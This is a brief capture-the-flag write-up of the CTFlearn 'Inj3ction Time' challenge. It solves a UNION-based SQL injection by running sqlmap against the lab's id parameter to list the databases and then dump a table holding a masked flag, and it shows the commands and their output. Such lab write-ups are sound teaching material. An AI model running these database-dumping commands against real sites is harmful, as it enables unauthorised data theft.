# Inj3ction Time 
From the description you’ll notice that there’s SQLi and you’ll use UNION query, the injection here is UNION based. Nice !

You’ll find that there’s input field ID and you should enter numbers and then you’ll see information about the users, if you try to insert words you won’t get anything

> You can use sqlmap

We must first extract the names of the existing databases :
```
python sqlmap.py -u https://web.ctflearn.com/web8/?id= -p id --dbs

available databases [2]:
[*] information_schema
[*] webeight
```
The next step is to extract the `webeight` database information
```
python sqlmap.py -u https://web.ctflearn.com/web8/?id= -p id -D webeight --dump

Database: webeight
Table: w0w_y0u_f0und_m3
[1 entry]
+---------------------------------+
| f0und_m3                        |
+---------------------------------+
| abctf{*-*-*-*-*-*-*-*-*-*-*-*-} |
+---------------------------------+
```